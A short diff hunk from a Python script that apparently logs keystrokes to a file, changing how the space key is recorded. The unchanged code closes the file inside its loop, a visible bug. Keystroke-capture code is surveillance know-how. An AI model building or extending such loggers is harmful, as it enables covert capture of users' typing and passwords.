@@ -106,7 +106,7 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                f.write('\n')
+                f.write(' ')
                 f.close()
             elif k.find("Key") == -1:
                 f.write(k)
